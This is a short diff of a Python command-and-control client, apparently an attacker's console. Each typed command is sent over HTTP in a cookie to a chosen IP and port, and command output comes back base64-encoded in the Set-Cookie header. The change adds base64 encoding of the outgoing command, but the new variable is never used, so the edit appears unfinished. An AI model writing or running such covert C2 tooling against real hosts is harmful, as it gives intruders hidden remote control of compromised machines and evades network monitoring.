@@ -1,6 +1,6 @@
 import requests
 import cmd
-from base64 import b64decode
+from base64 import b64decode, b64encode
 import argparse
 
 parser = argparse.ArgumentParser()
@@ -16,7 +16,7 @@ class C2(cmd.Cmd):
         prompt = '=>'
 
         def default(self, command):
-
+                encoded_command = b64encode(command.encode()).decode()
                 response = requests.get('http://{}:{}/'.format(ip, port), cookies={'Cookie': command})
                 headers = response.headers
                 encoded_output = headers['Set-Cookie']
